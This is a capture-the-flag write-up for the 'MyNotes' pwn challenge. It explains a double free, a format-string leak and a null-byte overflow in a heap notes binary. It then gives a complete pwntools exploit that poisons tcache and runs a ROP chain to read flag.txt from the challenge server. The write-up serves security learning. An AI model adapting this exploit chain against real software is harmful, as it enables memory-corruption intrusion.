### MyNotes - PWN
* Author&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : Heptaz
* Point&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : 0
* Difficulity&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : Easy
* Solved By&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : Eclair
---

### Description
*no description*<br>
<br>

### Analysis
I got the attachment file consist of [`ld-2.31.so, libc-2.31.so`, `mynotes`].<br>
<br>
so I used `pwninit` to make my local binary file use those `libc` and `ld` file that has been given.<br>
<br>
At first, I checked the binary file in `pwnchecksec` to see the protection on this binary file.<br>
<br>
![alt text](/images/image.png)<br>
<br>
as we can see this binary has full protection.<br>

| Protection | Status |
| :---: | :---: |
| RELRO | Full RELRO |
| Stack | Canary found |
| NX | NX enabled |
| PIE | PIE Enabled |

After I checked the protection, I start to diassembled this binary file into pseudo-C-code using `Ghidra`.<br>
<br>
- CREATE_NOTES<br>

<br>
![alt text](/images/image-1.png)<br>
<br>

- DELETE_NOTES<br>

<br>
![alt text](/images/image-2.png)<br>
<br>

- READ_NOTES<br>

<br>
![alt text](/images/image-3.png)<br>
<br>

And actually there is another function those are `setup_seccomp` and `find_empty`.<br>
Basically, it just setup what `syscall` can we use and `find_empty` just check how many chunk on the `heap` and the function said max 7.<br>
<br>
Okay, after several times to look up at the pseudo-code, finally, I found where the bugs are:<br>
<br>

- Double Free

```c
free(*(void **)(note + (long)local_18 * 0x10 + 8));
note[(long)local_18 * 0x10] = 1;
```

- Format String Attack
  
```c
printf("Note %d: ",(ulong)local_18);
if (note[(long)(int)local_18 * 0x10] == '\0') {
    printf(*(char **)(note + (long)(int)local_18 * 0x10 + 8));
```

- Null-byte-Off overflow (kinda hidden)

```c
*(void **)(note + (long)local_20 * 0x10 + 8) = local_18;
note[(long)local_20 * 0x10] = 0;
printf("Note: ");
sVar1 = read(0,local_18,(long)local_24);
local_1c = (int)sVar1;
*(undefined1 *)((long)local_18 + (long)local_1c) = 0;
puts("OK!");
```

Okay, I'll explain first, why we have these vulnerables, first one is `double free` since the code doesn't make the variable that hold heap address into `NULL`, we still have that memory that hold illegal area.<br>
And then for the `format string attack` I think it's kinda easy to tell because the `printf` didn't take any format specifier to tell program what it should print out.<br>
Last one, is `One-Byte-Null Overflow` kinda interesting because I need look it closely to figure it out.<br>
<br>
After we have all this, then what should we do, that's my first thought when see this. My first idea is to use `double free` immediately to create a poison in `bins`. But it not happened, why? because we're dealing with `tcachebins` that is more strict when we freed our chunk, because `tcachebins` will check first the thread that has same size with our chunk size, if the thread detected and found that the address we wanted freed already in thread, it will return `double free detected`.<br>
<br>
After some research, I found something clearly interesting, here it is, let's recall we have three vulnerabilities those are [`double free`, `format string attack`, and `null-byte-off overflow`]. The idea is, we will OVERWRITE THE SIZE OF CHUNK NEIGHBOR IN HEAP, how to do so?<br>
<br>
So, like this, since we can't `double free` same size chunk directly, so we will resize their chunk's size, okay, so I will make an example like this, from the photo, the function `create notes` will make a chunk in heap, so we can create new heap chunk.<br>
we create three chunk, with size `0x110`.<br> let's say, `A->B->C`. It mean, in the lowest address will be chunk A after chunk A there is chunk B and after chunk B there is chunk C placed in highest heap memory.<br>
<br>
After that, we will free them, but the sequence is reversed, so it will be `C->B->A`.<br>
<br>
`tcachebins 0x110 [3] : A->B->C->0`.<br>
<br>
that's just the overview of tcachebins, but literally like that and then we will create a heap again with same size, `0x110`. It mean we will take the chunk from the thread `0x110`<br>
<br>
`tcachebins 0x110 [2]: B->C->0` (because we already reused chunk A)
<br>
After that, we will fill chunk A with anything until `0x110` byte. what happen next? Yeah, absolutely true, `null-byte-off overflow` will overwrite size chunk B, from `0x110` -> `0x100`. <br>
<br>
What's the effect? It mean if we `free(chunk B)` again, tcache won't see that as `double free`, huh why? because tcache see chunk B in `0x100` byte not `0x110` byte, so literally we're doing `double free` same chunk but different size, so in the tcachebins it would be like this.<br>
<br>
`tcachebins 0x100 [1]: B->C` <br>
`tcachebins 0x110 [2]: B->C->0` <br>
<br>
And then if we create a chunk with size `0x100` it mean we will take chunk B in tcache `0x100` what happen with chunk B in thread `0x110`? Nothing happened with it, it still stay at there, the difference is we have control on that heap, if we write first byte until eight byte of chunk B, it will overwrite `fd` address that should be chunk C will be whatever we want, we got arbitrary write.<br>
<br>
If we write in chunk B size `0x100` with `FAKE_ADDRESS` so in thread `0x110` tcachebins will be like this.<br>
<br>
`tcachebins 0x10 [2]: B->FAKE_ADDRESS`<br>
<br>
and we just need to reuse chunk in thread `0x110` twice to get chunk B in `0x110` and that `FAKE_ADDRESS` to do arbitrary write.<br>

### Exploit
Here's my full exploit.<br>
```python
from pwn import *
import signal
import os

elf = context.binary = ELF('./mynotes_patched')
libc = ELF('./libc.so.6')
io = remote('103.152.242.90', 29934)
#io = process('./mynotes_patched')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'216')
io.sendlineafter(b'Note: ', b'%8$p %9$p %13$p')

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b'Index: ', b'0')

io.recvuntil(b'Note 0: ')
output = io.recvline().strip()
leak = output.split(b' ')

stack_address = int(leak[0], 16) - 0x18
binary_address = int(leak[1], 16) - 0x1afd
libc.address = int(leak[2], 16) - 0x24083

rop = ROP(libc)
bss_address = binary_address + 0x4000 #0x4290

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Index: ', b'0')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'264')
io.sendlineafter(b'Note: ', b'aaaa')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'264')
io.sendlineafter(b'Note: ', b'bbbb')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'264')
io.sendlineafter(b'Note: ', b'cccc')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Index: ', b'2')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Index: ', b'1')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Index: ', b'0')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'264')
io.sendlineafter(b'Note: ', b'a' * 264)

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Index: ', b'1')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'248')
io.sendlineafter(b'Note: ', p64(bss_address))

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'264')
io.sendlineafter(b'Note: ', b'test')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'264')
io.sendlineafter(b'Note: ', b'flag.txt\x00')

log.success(f'stak leak = {hex(stack_address)}')
log.success(f'binary leak = {hex(binary_address)}')
log.success(f'libc leak = {hex(libc.address)}')
log.success(f'bss leak = {hex(bss_address)}')
log.success(f'leak = {(leak)}')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'328')
io.sendlineafter(b'Note: ', b'aaaa')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'328')
io.sendlineafter(b'Note: ', b'bbbb')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'328')
io.sendlineafter(b'Note: ', b'cccc')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Index: ', b'6')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Index: ', b'5')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Index: ', b'4')

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Index: ', b'0')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'328')
io.sendlineafter(b'Note: ', b'a' * 328)

io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Index: ', b'5')

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'248')
io.sendlineafter(b'Note:', p64(stack_address))

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'328')
io.sendlineafter(b'Note: ', b'test')

pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_ret = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_ret = rop.find_gadget(['pop rdx', 'pop r12', 'ret'])[0]
pop_rax_ret = rop.find_gadget(['pop rax', 'ret'])[0]
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]

flag_address = bss_address + 0x500

#open
payload = p64(pop_rdi_ret)
payload += p64(bss_address)
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(2)
payload += p64(syscall_ret)

#read
payload += p64(pop_rdi_ret)
payload += p64(6)
payload += p64(pop_rsi_ret)
payload += p64(flag_address)
payload += p64(pop_rdx_ret)
payload += p64(0x40)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(0)
payload += p64(syscall_ret)

#write
payload += p64(pop_rdi_ret)
payload += p64(1)
payload += p64(pop_rsi_ret)
payload += p64(flag_address)
payload += p64(pop_rdx_ret)
payload += p64(0x40)
payload += p64(0)
payload += p64(pop_rax_ret)
payload += p64(1)
payload += p64(syscall_ret)

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'Size: ', b'328')
io.sendlineafter(b'Note: ', payload)

log.success(f'flag ad = {hex(flag_address)}')
log.success(f'pop rdi = {hex(pop_rdi_ret)}')
log.success(f'pop rsi = {hex(pop_rsi_ret)}')
log.success(f'pop rdx = {hex(pop_rdx_ret)}')
log.success(f'pop rax = {hex(pop_rax_ret)}')
log.success(f'syscall = {hex(syscall_ret)}')

io.interactive()
```
If I start it on local env. I'll get the flag.<br>
<br>
![alt text](/images/image-4.png)<br>
<br>
Hell yeah, that's all<br>

>Disclaimer<br>
Maybe there's something you don't understand, but feel free to ask
 
